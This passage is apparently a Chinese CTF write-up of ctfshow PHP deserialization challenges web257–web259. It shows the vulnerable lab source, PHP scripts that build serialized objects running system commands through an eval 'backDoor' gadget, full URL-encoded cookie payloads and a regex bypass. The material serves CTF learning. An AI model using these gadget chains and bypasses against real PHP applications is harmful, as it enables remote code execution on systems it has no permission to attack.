+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>入口点在__destruct()方法</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">__destruct():当对象被销毁时会自动调用，允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>在backDoor类中，存在getInfo方法，可以进行代码执行，而在ctfShowUser类的__destruct中，存在getInfo()，那么只需要在class属性中实例化backDoor类即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> backDoor();<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(ls);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
+<p>构造反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(tac fla*);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
+<p>传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#get</span><br>username=xxxxxx&amp;password=xxxxxx<br><br><span class="hljs-comment">#header</span><br>Cookie: <br>user=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ctfShowUser%<span class="hljs-number">00</span><span class="hljs-keyword">class</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>backDoor%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>backDoor%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>tac+fla%<span class="hljs-number">2</span>A%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>加了正则绕过，这里的<code>o</code>表示<code>common object</code>,<code>c</code>表示<code>custom object</code>。</p>
+<p>构造反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac fla*&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=str_replace(<span class="hljs-string">&#x27;:11&#x27;</span>,<span class="hljs-string">&#x27;:+11&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$d</span>=str_replace(<span class="hljs-string">&#x27;:8&#x27;</span>,<span class="hljs-string">&#x27;:+8&#x27;</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure>
+
+<p>传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#get</span><br>username=xxxxxx&amp;password=xxxxxx<br><span class="hljs-comment">#header</span><br>Cookie: <br>user=O%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span><span class="hljs-keyword">class</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>backDoor%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>tac+fla%<span class="hljs-number">2</span>A%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xff</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>array_pop(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = array_pop(<span class="hljs-variable">$xff</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>		file_put_contents(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$vip</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br><span class="hljs-comment">//vip can get flag one key</span><br><span class="hljs-variable">$vip</span>-&gt;getFlag();<br><br></code></pre></td></tr></table></figure>
+
+<p>需要利用内置类<strong>SoapClient</strong>，</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/10/ctfshow-thinkphp/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow-thinkphp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/06/ctfshow-ssrf/">
+                        <span class="hidden-mobile">ctfshow刷题之SSRF专题</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
